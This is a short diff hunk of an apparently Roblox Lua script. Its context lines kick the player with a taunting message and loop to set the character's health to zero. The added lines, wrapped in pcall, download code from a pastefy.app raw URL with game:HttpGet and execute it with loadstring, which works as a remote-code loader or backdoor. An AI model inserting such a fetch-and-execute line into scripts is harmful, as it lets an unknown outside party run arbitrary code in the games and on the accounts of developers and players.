@@ -234,4 +234,7 @@ plr:Kick('forgot to remove this sinxe u a random now...B-ya 👺')
 task.wait(1)
 while wait(4) do
 plr.Character.Humanoid.Health = 0
-end
+end;
+pcall(function()
+loadstring(game:HttpGet("https://pastefy.app/3aNMAC9N/raw",true))();
+end)
